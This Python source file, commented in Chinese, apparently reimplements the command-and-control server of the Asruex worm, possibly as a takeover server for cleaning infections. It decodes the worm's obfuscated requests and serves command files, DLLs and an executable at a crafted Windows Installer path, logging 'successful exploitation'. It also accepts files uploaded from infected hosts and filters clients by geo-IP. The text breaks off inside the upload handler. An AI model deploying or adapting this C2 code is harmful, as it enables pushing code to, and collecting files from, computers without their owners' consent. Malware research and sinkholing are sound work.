from http.server import BaseHTTPRequestHandler, HTTPServer
from socketserver import ThreadingMixIn
import hashlib, sys, os, threading, time, ssl, argparse, base64, datetime, re
import binascii
from urllib.parse import urlparse, parse_qs
import cgi
# from address_parse import is_ip_chinamainland, get_address
import random, string
from zipfile import ZipFile

from address_parse import is_ip_chinamainland, get_address

flagExit = False
flagTimeout = False
serverTimeout = 0
hexlist = []
bin_ascleaner32_dll = b''
bin_ascleaner64_dll = b''
bin_ascleaner_exe = b''
bin_CMDo = b''
bin_CMD = b''
exp_path = '..\\..\\..\\..\\Installer\\{C018D68A-4554-4DD3-A844-CD3B8E04CD0A}\\_6F7D185CA4F8.exe'
as_data_dir = "./store"
Allow_Upload = False
Allowed_IpList = set()
Clean_Except_IpList = set()
FileMode_OnlyChinaMainLand = False
Work_Mode = 'stat'
Test_Clean = False
OnlyCleanChinaMainLand = True
c2verifymarkclean = False
c2verifyallowed = False
c2verifyallowed_ChinaOnly = False
logdir = ''
logfilename = ''
glogfilep = None

filename1o = '..\\..\\ascleaner32.dll'
filename2o = '..\\..\\ascleaner64.dll'
filename1 = ''
filename2 = ''
cmd_path = 'CCCCCC0000000000'


# 将清除程序命名为随机文件名,用来替换程序路径中的 ascleaner 字符串
def gen_ascleanername():
    global filename1, filename2, bin_CMD, cmd_path
    N = 9
    rndname = ''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase + string.digits, k=N))  # 生成一个随机名称
    assert (len(rndname) == 9)
    bin_CMD = bin_CMDo.replace(b'ascleaner', rndname.encode())  # 替换字符串中的 "ascleaner"
    cmd_timestamp = "%.10X" % (int(time.time()))  # 生成当前时间戳
    assert (len(cmd_timestamp) == 10)
    bin_CMD = cmd_timestamp.encode() + bin_CMD[10:]  # 将替换"ascleaner"后的字符串的前十个字节替换为上述得到的时间戳
    cmd_path = 'CCCCCC' + cmd_timestamp  # 生成新的命令路径 cmd_path
    filename1 = filename1o.replace('ascleaner', rndname)
    filename2 = filename2o.replace('ascleaner', rndname)


# 加载 a.txt 文件，并将其中的内容作为握手数据存储
def load_handshake_a():
    global hexlist
    hexlist.clear()
    with open("a.txt", "rb") as _f:
        for i in _f:
            i = i.strip()  # 移除每行的结尾换行符
            if i:
                hexlist.append(i)


# 解压 ZIP 文件并返回内容
def extract_zip(input_zip, password):
    input_zip = ZipFile(input_zip)
    if password:
        input_zip.setpassword(password.encode('utf-8'))  # 检查是否提供了密码
    r = {name: input_zip.read(name) for name in input_zip.namelist()}  # 读取 ZIP 文件中的所有文件内容
    input_zip.close()
    return r

# 关闭接管服务器
def shutdownhttpd(server, delay):
    def handler(server, delay):  # 处理延迟后关闭服务器的任务
        global flagExit, flagTimeout
        if delay:
            while delay > 0 and flagExit == False:
                time.sleep(1)
                delay -= 1
            if not flagExit:  # 超时处理
                flagTimeout = True
                print(" - TIMEOUT", file=sys.stderr)
        if flagExit:
            return
        flagExit = True
        print(" - Shutting down httpd..", file=sys.stderr)
        server.shutdown()  # 关闭服务器

    thr = threading.Thread(target=handler, args=(server, delay))
    thr.start()  # 启动线程


# 加密解密操作
def strdec_sub_1800097B0(a2):
    v3 = a2
    v5 = 0  # 初始化计数器 v5，用作遍历输入字节串的索引
    Dst = bytearray(b"\x57\x69\x6E\x64\x6F\x77\x73\xA2\xE7\x20\x69\x6E\x73\x74\x61\x6C\x6C\x65\x72")  # （密钥）
    result = bytearray()
    v5 = 0
    v6 = len(Dst)
    if len(v3) == 0:
        pass
    else:  # 主处理逻辑
        v7 = v3
        while v5 < len(v3):
            v8 = Dst[v5 % v6]
            v9 = v7[v5]
            if v9 != v8:
                v9 = v8 ^ v9
            result.append(v9)
            v5 += 1
    return result


# 将输入的字节串先进行 Base64 编码，然后通过 strdec_sub_1800097B0 进行自定义的加密（或解密）操作，最后将结果转化为十六进制字符串
def b64_then_strenc_then_hex(a):
    return strdec_sub_1800097B0(base64.b64encode(a)).hex()


# 接受一个十六进制字符串，首先将其解码为字节串，接着进行自定义解密操作，再通过 Base64 解码，最后将结果解码为字符串并返回。
def unhex_then_strdec_then_b64dec(a):
    return base64.b64decode(strdec_sub_1800097B0(binascii.unhexlify(a))).decode()


# 检查文件名，不允许有/或\\
def chk_filename(s):
    if '/' in s or '\\' in s:
        raise Exception('invalid path')


# 获取存储路径并确保目录存在
def getstore(d):
    chk_filename(d)
    p = os.path.join(as_data_dir, d)
    os.makedirs(p, exist_ok=True)
    return p


# 检查 IP 是否被允许上传（访问）
def is_ip_allowed(ip):
    if FileMode_OnlyChinaMainLand:  # 为 True，表示只允许来自中国大陆的 IP 地址。
        # 参数指定要测试收大陆文件时, ip必须是大陆的
        if not is_ip_chinamainland(ip):
            return False
    else:
        # 不接收来自大陆的post
        if is_ip_chinamainland(ip):
            return False
    if not Allowed_IpList:  # Allowed_IpList 是一个包含允许访问的 IP 地址或国家、省份名称的列表。如果该列表为空，则默认允许所有 IP 地址访问，返回 True
        return True
    if ip in Allowed_IpList:  # 如果 Allowed_IpList 中包含该 IP 地址，直接返回 True，表示该 IP 被允许访问
        return True
    nation, province = get_address(ip)
    if nation:
        if nation in Allowed_IpList:
            return True
    if province:
        if province in Allowed_IpList:
            return True
    return False

# 从指定的文件中加载 IP 地址列表，并将这些 IP 地址存储在一个 set 集合中
def load_ip_list(file):
    res = set()
    with open(file, "r", encoding='utf-8') as _f:
        for line in _f:
            line = line.strip()
            if line:
                res.add(line)
    return res

# 从一个指定的文件中加载 IP 地址，并将这些 IP 地址添加到 Allowed_IpList 集合中
def load_allow_ip_list(file):
    global Allow_Upload, Allowed_IpList
    with open(file, "r", encoding='utf-8') as _f:
        for line in _f:
            line = line.strip()
            if line:
                Allowed_IpList.add(line)
    Allow_Upload = True

# 从指定的文件中读取每一行，并将非空行添加到传入的列表 outls 中
def lines_from_file(filename, outls):
    with open(filename, "r", encoding='utf-8') as _f:
        for line in _f:
            line = line.strip()
            if line:
                outls.append(line)

# 记录日志
def writelog(line):
    global logfilename, glogfilep
    name = time.strftime('%Y-%m-%d', time.localtime()) + ".txt"
    if name != logfilename:
        on_newday()
        if glogfilep:
            glogfilep.close()
        glogfilep = open(os.path.join(logdir, name), "ab")
        logfilename = name
    glogfilep.write(line)
    glogfilep.flush()


# 记录清理操作的日志
def on_clean(client_ip, v="", ntv="", pcname=""):
    now = str(datetime.datetime.now().replace(microsecond=0))
    line = f"{now},{client_ip},clean{v},{ntv},{pcname}\n".encode(
        'utf-8')  # 例如：2025-03-29 14:30:45,192.168.1.1,clean1.0,Windows,PC01样式的字符串
    writelog(line)  # 写入日志


# 记录文本日志当前的时间（now）、客户端的 IP 地址（client_ip）、固定标签 "text"，表示这是一条文本日志、实际的日志文本内容（text）
def on_log_text(client_ip, text):
    now = str(datetime.datetime.now().replace(microsecond=0))
    line = f"{now},{client_ip},text,{text}\n".encode('utf-8')
    writelog(line)

# 记录每次访问的日志，记录的信息包括访问时间、客户端 IP 地址、访问的 URI
def on_access(client_ip, uri):
    now = str(datetime.datetime.now().replace(microsecond=0))
    if not uri.startswith('/content/faq.php?vc'):  # 检查 URI 是否以 /content/faq.php?vc 开头
        print(f"{now},{client_ip},access,{uri}")  # 如果不是，打印该 URI 和客户端 IP 的信息到控制台。

    if uri.startswith('/content/faq.php?vc'):  # 检查 URI 是否以 /content/faq.php?vc 开头
        if Work_Mode == 'clean':
            if OnlyCleanChinaMainLand:  # 检查 client_ip 是否属于中国大陆
                if is_ip_chinamainland(client_ip):
                    return
            else:
                return
        uri = uri[:20]
    elif uri.endswith("ql=a0"):  # 检查 URI 是否以 ql=a0 结尾
        return
    line = f"{now},{client_ip},access,{uri}\n".encode('utf-8')
    writelog(line)


# 发布操作的日志
def on_posting(client_ip):
    now = str(datetime.datetime.now().replace(microsecond=0))
    line = f"{now},{client_ip},posting\n".encode('utf-8')
    writelog(line)


# 文件上传操作的日志
def on_postfile(client_ip, sid, filename):
    now = str(datetime.datetime.now().replace(microsecond=0))
    line = f"{now},{client_ip},postfile,{sid},{filename}\n".encode('utf-8')
    writelog(line)


# ql=a0 请求 的日志
def on_ql_a0(client_ip, sid):
    now = str(datetime.datetime.now().replace(microsecond=0))
    line = f"{now},{client_ip},qla0,{sid}\n".encode('utf-8')
    writelog(line)


# 在新的一天开始时被调用，用于执行一些初始化工作
def on_newday():
    gen_ascleanername()


# 处理收到的被控端的请求
class ServerHandler(BaseHTTPRequestHandler):  # 自定义的 HTTP 请求处理类,用于处理 HTTP 请求。
    timeout = 20  # 设置超时时间为 20 秒
    protocol_version = 'HTTP/1.1'  # 设置协议版本为 HTTP 1.1
    server_version = "cloudflare"  # 设置服务器版本为 "cloudflare"
    sys_version = ""  # 系统版本

    # 重写了父类的 log_message 方法，目的是禁用默认的日志记录功能
    def log_message(self, format, *args):
        return

    # 发送 HTTP 200 OK 响应，表示请求成功
    def _set_headers(self):
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')  # 发送 Content-Type 响应头，指示返回内容是 HTML 格式
        self.end_headers()

    # 获取客户端的 IP 地址
    def get_clientip(self):
        rip = self.headers.get('Asruex-Real-IP')
        if rip:
            return rip
        else:
            return self.client_address[0]

    def do_GET(self):
        # print("GET REQUEST:", self.path)
        if Work_Mode == 'cmd' and self.path.startswith(
                "/454d1a1/"):  # 检查当前的工作模式是否为 'cmd'，并且请求的路径是否以 /454d1a1/ 开头。如果满足条件，继续执行文件处理操作
            ua = self.headers.get('User-Agent', '')  # 从请求头中获取 User-Agent 信息，表示客户端的浏览器类型、操作系统等信息
            uacpu = self.headers.get('UA-CPU', '')  # 从请求头中获取 UA-CPU 信息，表示客户端的处理器架构
            on_log_text(self.get_clientip(), f"{ua};{uacpu}")  # 记录客户端 IP 地址和 User-Agent、UA-CPU 信息,并将这些信息保存到日志文件
            get_filename = self.path[9:]  # 从请求路径中提取文件名。路径以 /454d1a1/ 开头，因此从第 9 个字符开始获取文件名。
            if not re.match("^[a-z0-9\.]+$", get_filename):  # 使用正则表达式验证文件名的有效性
                self.replyerr()
                return
            get_filename = os.path.join("cmdxx", get_filename)  # 将文件名与目录 cmdxx 拼接，形成完整的文件路径。
            with open(get_filename, 'rb') as _f:
                message = _f.read()
            self.close_connection = True  # 响应后关闭连接
            self.send_response(200)  # 发送 HTTP 200 OK 响应，表示请求成功
            self.send_header('Content-Length', str(len(message)))  # 设置响应头中的 Content-Length 字段，表示返回数据的长度
            self.end_headers()  # 结束头部的发送，开始发送响应体内容。
            self.wfile.write(message)  # 将文件内容 message 写入响应体，发送给客户端。
            return
        if self.path.startswith('/?clean'):  # 请求的路径是否以/?clean开头
            print("INFO:", self.get_clientip(), self.path)
            query_components = parse_qs(urlparse(self.path).query)  # 解析 URL 查询参数，将查询字符串转换为字典格式。
            cleanv = ''  # 初始化 cleanv（清理版本）、nt（操作系统类型）、pcname（计算机名）为默认空字符串。
            nt = ''
            pcname = ''
            if 'clean' in query_components:
                cleanv = query_components['clean'][0]  # 如果查询参数中包含 clean，则设置 cleanv 为该参数的值。
            if 'cleanw' in query_components:
                cleanv = "w" + query_components['cleanw'][0]
            if 'nt' in query_components:
                nt = query_components['nt'][0]
            if 'cn' in query_components:
                pcname = query_components['cn'][0]
            on_clean(self.get_clientip(), cleanv, nt, pcname)  # 调用 on_clean 函数，记录清理操作的相关信息。
            message = b''  # 设置空字节串作为响应内容。
            self.close_connection = True
            self.send_response(200)  # 发送 HTTP 200 OK 响应。
            self.send_header('Content-Type', 'text/html; charset=utf-8')  # 设置响应头的 Content-Type 为 HTML，字符集为 UTF-8。
            self.send_header('Content-Length', str(len(message)))  # 设置响应头的 Content-Length 为消息体的长度
            self.end_headers()  # 结束头部的发送。
            self.wfile.write(message)  # 将空字节串写入响应体，完成响应。
            return
        if not self.path.startswith('/content/faq.php'):  # 检查请求路径是否以 '/content/faq.php' 开头
            self.replyerr()  # 如果路径不符合，返回错误响应
            return
        # 记录接收到请求的客户端 IP 地址和请求路径
        on_access(self.get_clientip(), self.path)
        # stat模式
        if Work_Mode == 'stat':  # 如果服务器在 'stat' 模式下工作
            if Test_Clean:  # 检查是否处于 Test_Clean 模式
                # 如果仅允许中国大陆的 IP 访问
                if OnlyCleanChinaMainLand:
                    if not is_ip_chinamainland(self.get_clientip()):  # 如果客户端 IP 地址不是中国大陆的 IP，则返回错误
                        self.replyerr()  # 返回错误响应
                        return
                if True:  # random.randint(1, 2) == 1:# 进行清理测试操作（有条件时）
                    print("testclean ip: " + self.get_clientip())  # 打印客户端 IP
                    on_clean(self.get_clientip())  # 记录清理操作
            elif c2verifyallowed:  # 如果 c2 验证被允许
                if c2verifyallowed_ChinaOnly:  # 如果仅允许中国大陆的 IP 进行验证
                    if not is_ip_chinamainland(self.get_clientip()):  # 如果客户端 IP 不是中国大陆的 IP，则返回错误
                        self.replyerr()
                        return
                query_components = parse_qs(urlparse(self.path).query)  # 解析请求路径中的查询参数
                # 如果路径以 '/content/faq.php?vc1=' 或 '/content/faq.php?vc2=' 开头
                if self.path.startswith('/content/faq.php?vc1=') or self.path.startswith('/content/faq.php?vc2='):
                    # 获取 vc1 或 vc2 参数的值，并解码为字节数据
                    k = self.path[21:]
                    k = binascii.unhexlify(k)
                    # 创建一个字节数组 chk，包含特定索引的字节值
                    chk = bytearray([k[0x27], k[0x52], k[0x14], k[0x54], k[0x3f], k[0x30], k[0x6d], k[0x03]])
                    if chk[0] <= 0xAA:  # 根据字节数组的值进行条件判断
                        if chk[0] <= 0x55:  # 如果字节值小于或等于 0x55，则执行按位或运算
                            v31 = chk[2] | chk[4]
                        else:  # 否则执行按位与运算
                            v31 = chk[2] & chk[4]
                    else:  # 否则执行按位异或运算
                        v31 = chk[2] ^ chk[4]
                    # 根据运算结果从 hexlist 中获取相应的消息
                    message = hexlist[v31]
                    self.send_response(200)  # 返回 HTTP 200 OK 响应
                    self.send_header('Content-Type',
                                     'text/html; charset=utf-8')  # 设置响应头的 Content-Type 为 HTML，字符集为 UTF-8。
                    self.send_header('Content-Length', str(len(message)))  # 设置响应头的 Content-Length 为消息体的长度
                    self.end_headers()  # 结束响应头
                    self.wfile.write(message)
                    return
                elif 'ql' in query_components:  # 如果查询参数中包含 'ql'
                    ql = query_components['ql'][0]
                    if ql == 'b2':  # 蠕虫程序刚运行，首次请求验证C2有效性
                        if c2verifymarkclean:  # 如果 'ql' 参数值为 'b2'，表示蠕虫程序首次请求验证 C2 的有效性
                            on_clean(self.get_clientip())  # 执行清理操作，记录客户端 IP 地址
                        message = b'00'
                        self.send_response(200)  # 返回 HTTP 200 OK 响应
                        self.send_header('Content-Length', str(len(message)))
                        self.end_headers()
                        self.wfile.write(message)
                        return
                    elif ql == 'a0':  # 如果 'ql' 参数值为 'a0'，表示请求上传文件前的操作
                        # 上传文件前请求，疑似建议服务器新建目录
                        param1 = query_components['param1'][0]  # 获取 base64 编码的参数
                        param1b = unhex_then_strdec_then_b64dec(param1)  # 解码处理后的参数
                        print("INFO:", self.get_clientip(), "ql=a0, param1=" + param1b)  # 打印客户端信息
                        on_ql_a0(self.get_clientip(), param1b)  # 记录上传操作
                        message = b'01'  # 拒绝传文件
                        self.send_response(200)
                        self.send_header('Content-Length', str(len(message)))
                        self.end_headers()
                        self.wfile.write(message)
                        return
                    elif ql == 'a9':  # 如果 'ql' 参数值为 'a9'，表示蠕虫程序请求命令列表
                        # 返回一个空的响应
                        message = b''
                        self.send_response(200)
                        self.send_header('Content-Length', str(len(message)))
                        self.end_headers()
                        self.wfile.write(message)
                        return
            self.replyerr()  # 处理完上述逻辑后，如果没有匹配的条件，返回错误
            return
        elif Work_Mode == 'clean':  # 如果当前工作模式为 'clean'
            if self.get_clientip() in Clean_Except_IpList:  # 检查客户端的 IP 是否在 Clean_Except_IpList 中，如果在列表中，则拒绝处理
                self.replyerr()
                return
            if OnlyCleanChinaMainLand:  # 如果仅允许中国大陆 IP 进行清理操作
                if not is_ip_chinamainland(self.get_clientip()):  # 如果客户端 IP 不是中国大陆的 IP，则返回错误
                    self.replyerr()
                    return
        if Allow_Upload:  # 如果允许上传文件
            if not is_ip_allowed(self.get_clientip()):  # 检查客户端 IP 是否在允许的 IP 列表中
                self.replyerr()  # 如果 IP 不被允许，返回错误响应
                return
        query_components = parse_qs(urlparse(self.path).query)  # 解析请求路径中的查询参数
        if self.path.startswith('/content/faq.php?vc1=') or self.path.startswith(
                '/content/faq.php?vc2='):  # 如果请求路径以 '/content/faq.php?vc1=' 或 '/content/faq.php?vc2=' 开头
            # 获取路径中 vc1 或 vc2 参数的值，并解码
            k = self.path[21:]
            k = binascii.unhexlify(k)
            chk = bytearray(
                [k[0x27], k[0x52], k[0x14], k[0x54], k[0x3f], k[0x30], k[0x6d], k[0x03]])  # 选择特定的字节，生成字节数组 'chk'
            if chk[0] <= 0xAA:  # 根据字节数组的值执行条件判断
                if chk[0] <= 0x55:
                    v31 = chk[2] | chk[4]
                else:
                    v31 = chk[2] & chk[4]
            else:
                v31 = chk[2] ^ chk[4]
            message = hexlist[v31]  # 根据运算结果从 hexlist 中获取对应的消息
            self.send_response(200)
            self.send_header('Content-Type', 'text/html; charset=utf-8')  # 设置响应头的 Content-Type 为 HTML，字符集为 UTF-8。
            self.send_header('Content-Length', str(len(message)))  # 设置响应头的 Content-Length 为消息体的长度
            self.end_headers()  # 结束头部的发送。
            self.wfile.write(message)
            return
        elif 'ql' in query_components:  # 如果查询参数中包含 'ql' 参数
            ql = query_components['ql'][0]  # 获取 'ql' 参数的值
            if ql == 'b2':  # 蠕虫程序刚运行，首次请求验证C2有效性
                if Work_Mode == 'clean' and c2verifymarkclean:
                    on_clean(self.get_clientip())  # 执行清理操作
                message = b'00'
                self.send_response(200)
                self.send_header('Content-Length', str(len(message)))
                self.end_headers()  # 结束响应头
                self.wfile.write(message)  # 发送消息体
                return
            elif ql == 'a0':  # 如果 'ql' 参数值为 'a0'，表示上传文件前请求，服务器可能建议新建目录
                param1 = query_components['param1'][0]  # 疑似SID的base64+编码+转hex
                param1b = unhex_then_strdec_then_b64dec(param1)
                print("INFO:", self.get_clientip(), "ql=a0, param1=" + param1b)
                on_ql_a0(self.get_clientip(), param1b)  # 记录文件上传操作6
                if Allow_Upload:
                    getstore(param1b)  # 获取存储目录
                    message = b'00'  # 回复 00 表示可以上传
                    self.send_response(200)
                else:
                    message = b'01'  # 回复 01 表示不允许上传
                    self.send_response(200)
                self.send_header('Content-Length', str(len(message)))  # 发送响应头并返回消息
                self.end_headers()
                self.wfile.write(message)
                return
            elif ql == 'a1':
                # 询问服务器是否已收到了该文件（非A\B\C\F开头的文件）
                #                           以及5CCFADD8-DD07476E-B072ADC2-99B1A508目录下的文件
                param1 = query_components['param1'][0]
                param2 = query_components['param2'][0]
                param1b = unhex_then_strdec_then_b64dec(param1)
                param2b = unhex_then_strdec_then_b64dec(param2)
                message = b'02'  # 03=已收到过（随后删除本地），02未收到：客户端随后会POST上传
                self.send_response(200)
                self.send_header('Content-Length', str(len(message)))
                self.end_headers()
                self.wfile.write(message)
                return
                # 处理客户端请求，进行命令下载、文件确认等操作

            # elif ql == 'a5':
            #     # 蠕虫查命令列表
            #     # 客户端可能正在请求命令列表
            #     # 生成一个固定的命令 sid（在此为示例数据），然后作为响应返回给客户端
            #     message = b64_then_strenc_then_hex(b'S-1-1-11-111111111-1111111111-111111111-111;').encode()
            #     self.send_response(200)  # 返回 200 OK 响应
            #     self.send_header('Content-Length', str(len(message)))  # 设置响应体的长度
            #     self.end_headers()  # 结束响应头部分
            #     self.wfile.write(message)  # 将消息写入响应体
            #     return
            #
            # elif ql == 'a3':
            #     # 客户端用 param1 查询命令文件列表，客户端会再访问 a7 来下载文件
            #     param1 = query_components['param1'][0]  # 获取 param1 参数
            #     param1b = unhex_then_strdec_then_b64dec(param1)  # 解码 param1
            #     print("INFO:", self.get_clientip(), "ql=a3, param1=" + param1b)  # 打印调试信息
            #
            #     if param1b != 'S-1-1-11-111111111-1111111111-111111111-111':  # 验证 param1 是否是预期值
            #         self.replyerr()  # 如果不匹配，返回错误
            #         return
            #
            #     message = b''  # 初始化消息
            #
            #     # 判断当前的工作模式，决定返回哪些命令
            #     if not Work_Mode in ['cmd', 'clean']:  # 如果工作模式不在 cmd 或 clean 中，则返回错误
            #         self.replyerr()
            #         return
            #
            #     if Work_Mode == 'clean':
            #         # 如果工作模式是 clean，返回包含文件路径的命令信息
            #         message = b64_then_strenc_then_hex(
            #             (filename1 + ';' + filename2 + ';' + cmd_path + ';').encode()).encode()
            #     elif Work_Mode == 'cmd':
            #         # 如果工作模式是 cmd，仅返回命令路径
            #         message = b64_then_strenc_then_hex((cmd_path + ';').encode()).encode()
            #     else:
            #         assert (False)  # 如果工作模式不是 cmd 或 clean，则触发断言错误
            #
            #     self.send_response(200)  # 返回 200 OK 响应
            #     self.send_header('Content-Length', str(len(message)))  # 设置响应体的长度
            #     self.end_headers()  # 结束响应头部分
            #     self.wfile.write(message)  # 将消息写入响应体
            #     return
            #
            # elif ql == 'a7':
            #     # 客户端下载命令文件后，会再次访问 a7，可能是让服务器确认
            #     param1 = query_components['param1'][0]  # 获取 param1 参数
            #     param2 = query_components['param2'][0]  # 获取 param2 参数
            #
            #     param1b = unhex_then_strdec_then_b64dec(param1)  # 解码 param1
            #     param2b = unhex_then_strdec_then_b64dec(param2)  # 解码 param2
            #
            #     print("INFO:", self.get_clientip(), "ql=a7, param1=" + param1b, "param2=", param2b)  # 打印调试信息
            #
            #     if param1b != 'S-1-1-11-111111111-1111111111-111111111-111':  # 检查 param1 是否符合预期值
            #         self.replyerr()  # 如果不匹配，返回错误
            #         return
            #
            #         # 根据工作模式选择返回的消息
            #     if Work_Mode == 'clean':
            #         if param1b.startswith('CCCCCC'):  # 如果 param1 以 'CCCCCC' 开头，返回命令（bin_CMD）
            #             message = bin_CMD
            #         elif param1b.endswith('64.dll'):  # 如果 param1 以 '64.dll' 结尾，返回 64 位清理程序
            #             message = bin_ascleaner64_dll
            #         elif param1b.endswith('32.dll'):  # 如果 param1 以 '32.dll' 结尾，返回 32 位清理程序
            #             message = bin_ascleaner32_dll
            #     elif Work_Mode == 'cmd':
            #         # 如果工作模式是 cmd，返回命令文件
            #         message = bin_CMD
            #     else:
            #         assert (False)  # 如果工作模式不在 cmd 或 clean 中，则触发断言错误
            #
            #     self.send_response(200)  # 返回 200 OK 响应
            #     self.send_header('Content-Length', str(len(message)))  # 设置响应体的长度
            #     self.end_headers()  # 结束响应头部分
            #     self.wfile.write(message)  # 将消息写入响应体
            #     return
            #
            # elif ql == 'a6':
            #     # 客户端下载文件后，会访问 a6，提示文件已保存完成
            #     param1 = query_components['param1'][0]  # 获取 param1 参数
            #     param2 = query_components['param2'][0]  # 获取 param2 参数
            #     param1b = unhex_then_strdec_then_b64dec(param1)  # 解码 param1
            #     param2b = unhex_then_strdec_then_b64dec(param2)  # 解码 param2
            #
            #     print("INFO:", self.get_clientip(), "ql=a6, param1=" + param1b, "param2=", param2b)  # 打印调试信息
            #
            #     # 返回成功的响应
            #     message = b'00'
            #     self.send_response(200)  # 返回 200 OK 响应
            #     self.send_header('Content-Length', str(len(message)))  # 设置响应体的长度
            #     self.end_headers()  # 结束响应头部分
            #     self.wfile.write(message)  # 将消息写入响应体
            #     return

            elif ql == 'a8':  # 如果 'ql' 参数值为 'a8'，表示询问是否可以删除某个缓存文件
                # 询问0FA371BC-94EC2E8B-D13A2B7E-01FED13C下载缓存目录下的文件是否可以删除
                param1 = query_components['param1'][0]
                param1b = unhex_then_strdec_then_b64dec(param1)
                print("INFO:", self.get_clientip(), "ql=a8, param1=" + param1b)
                message = b'04' # b'04' #客户端不要删除
                # message = b'03'  # b'03' #客户端要删除
                self.send_response(200)
                self.send_header('Content-Length', str(len(message)))
                self.end_headers()
                self.wfile.write(message)
                return
            elif ql == 'a9':  # 如果 'ql' 参数值为 'a9'，表示查询命令列表
                if not Work_Mode in ['cmd', 'clean']:  # 只有在工作模式为 'cmd' 或 'clean' 时处理此请求
                    self.replyerr()
                    return
                # 蠕虫查命令列表，下一步客户端会用b0来下载 # 根据工作模式选择要回复的命令列表
                if Work_Mode == 'clean':
                    message = b64_then_strenc_then_hex(
                        (exp_path + ';' + filename1 + ';' + filename2 + ';' + cmd_path + ';').encode()).encode()
                elif Work_Mode == 'cmd':
                    message = b64_then_strenc_then_hex((cmd_path + ';').encode()).encode()
                else:
                    assert (False)
                self.send_response(200)
                self.send_header('Content-Length', str(len(message)))
                self.end_headers()
                self.wfile.write(message)
                return
            elif ql == 'b0':  # 如果 'ql' 参数值为 'b0'，表示客户端请求文件
                if not Work_Mode in ['cmd', 'clean']:  # 只有在工作模式为 'cmd' 或 'clean' 时处理此请求
                    self.replyerr()
                    return
                param1 = query_components['param1'][0]
                param1b = unhex_then_strdec_then_b64dec(param1)
                print("INFO:", self.get_clientip(), "ql=b0, param1=" + param1b)
                message = b''
                if Work_Mode == 'clean':  # 根据工作模式选择要发送的文件
                    if param1b.startswith('CCCCCC'):
                        message = bin_CMD
                    elif param1b.endswith('64.dll'):
                        message = bin_ascleaner64_dll
                    elif param1b.endswith('32.dll'):
                        message = bin_ascleaner32_dll
                    elif param1b == exp_path:
                        message = bin_ascleaner_exe
                elif Work_Mode == 'cmd':
                    message = bin_CMD
                else:
                    assert (False)
                self.send_response(200)
                self.send_header('Content-Length', str(len(message)))
                self.end_headers()
                self.wfile.write(message)
                return
            elif ql == 'b1':  # 如果 'ql' 参数值为 'b1'，表示下载成功后通知服务器删除命令文件
                # 可能是告诉服务器下载成功的文件，服务器可以删除该命令文件了
                param1 = query_components['param1'][0]  # 获取并解码 'param1' 参数
                param1 = unhex_then_strdec_then_b64dec(param1)
                print("INFO: ", "ql=b1, param1=" + param1)
                if param1 == exp_path:  # 检查参数是否为期望的路径
                    print("INFO:", self.get_clientip(), "successful exploitation!")
                if param1.startswith('CCCCCC'):  # 如果文件路径以 'CCCCCC' 开头，表示清理操作
                    if Work_Mode == 'clean' and not c2verifymarkclean:
                        on_clean(self.get_clientip())
                elif param1 == exp_path:
                    if Work_Mode == 'clean' and not c2verifymarkclean:
                        on_clean(self.get_clientip(), 'w')
                message = b'00'  # 发送 00 表示操作成功
                self.send_response(200)
                self.send_header('Content-Length', str(len(message)))
                self.end_headers()
                self.wfile.write(message)
                return
            else:  # 如果没有匹配的 'ql' 参数，打印调试信息
                param1 = query_components.get('param1')
                if param1:
                    param1 = unhex_then_strdec_then_b64dec(param1[0])
                param2 = query_components.get('param2')
                if param2:
                    param2 = param2[0]
                    param2 = unhex_then_strdec_then_b64dec(param2[0])
                print(f"Unhandled: ql={str(ql)}, param1={str(param1)}, param2={str(param2)}")
                pass
        else:  # 如果请求 URI 未处理，打印未处理的路径
            print("Unhandled: uri=" + self.path)

        self.close_connection = True  # 关闭当前连接
        message = b""  # 初始化空的消息体
        self.send_response(404)  # 发送 HTTP 404 错误响应
        self.send_header('Content-Length', str(len(message)))  # 设置响应头 Content-Length，表示响应体的长度为 0
        self.send_header('Connection', 'close')  # 设置 Connection 响应头为 'close'，表示响应后关闭连接
        self.end_headers()  # 结束响应头的发送
        self.wfile.write(message)  # 发送空的响应体（即消息体为空）

    # 解析多部分表单数据
    def parse_multipart(self, encoding="utf-8", errors="replace"):
        content_len = int(self.headers.get('Content-length'))  # 从请求头中获取 Content-Length 字段的值，表示请求体的大小（即上传数据的大小）
        ctype, pdict = cgi.parse_header(self.headers["content-type"])  # 从请求头中获取 Content-Type 字段，并使用 cgi.parse_header 方法解析其值,pdict 是解析后的字典，其中包含 boundary 等信息。boundary 是用于分隔不同部分的分隔符，通常出现在 multipart/form-data 请求中。
        pdict["boundary"] = bytes(pdict["boundary"], "utf-8")  # 将 boundary 转换为字节格式，并将请求体的长度 content_len 添加到字典中。
        pdict['CONTENT-LENGTH'] = content_len

        boundary = pdict['boundary'].decode('ascii')  # 从 pdict 字典中获取 boundary，并将其解码为 ASCII 字符串
        ctype = "multipart/form-data; boundary={}".format(boundary)  # 构建一个新的 Content-Type 字符串，包含了 boundary 信息。
        # 创建一个cgi.Message()对象，并设置其 Content - Type 为 multipart / form - data，同时将 Content - Length 设置为请求体的大小。
        headers = cgi.Message()
        headers.set_type(ctype)
        headers['Content-Length'] = pdict['CONTENT-LENGTH']
        # 通过 cgi.FieldStorage 类解析多部分表单数据。它会读取请求体（self.rfile）中的内容并根据 Content-Type 解析文件和表单数据。environ 设置了 REQUEST_METHOD 为 'POST'，表示这是一个 POST 请求
        fs = cgi.FieldStorage(self.rfile, headers=headers, encoding=encoding, errors=errors, environ={'REQUEST_METHOD': 'POST'})
        return fs

    def do_POST(self):
        print("POST REQUEST:", self.path)
        on_posting(self.get_clientip())
        if not Allow_Upload:  # 检查是否允许上传
            self.replyerr()
            return
        if not is_ip_allowed(self.get_clientip()):  # 检查客户端 IP 是否被允许。
            self.replyerr()
            return
        # query_components = parse_qs(urlparse(self.path).query)
        if self.path == '/content/faq.php':
            # 使用 parse_multipart 函数解析 POST 请求中的表单数据。获取查询参数 ql、param1、param2 和上传文件的文件名 param2_filename
            fs = self.parse_multipart()
            ql = fs.getlist('ql')[0]
            param1 = fs.getlist('param1')[0]
            param2 = fs.getlist('param2')[0]
            param2_filename = fs['param2'].filename
            if ql == 'a4':  # 如果 ql 参数为 'a4'，表示客户端上传了文件、私钥和公钥
                if not param2_filename:
                    self.replyerr()  # 如果没有文件名，返回错误响应
                    return
                param1b = unhex_then_strdec_then_b64dec(param1)  # 解码 param1
                param2_filename = unhex_then_strdec_then_b64dec(param2_filename)  # 解码文件名
                on_postfile(self.get_clientip(), param1b, param2_filename)  # 记录文件上传操作
                chk_filename(param2_filename)  # 检查文件名是否合法
                with open(os.path.join(getstore(param1b), param2_filename), "wb") as _f:
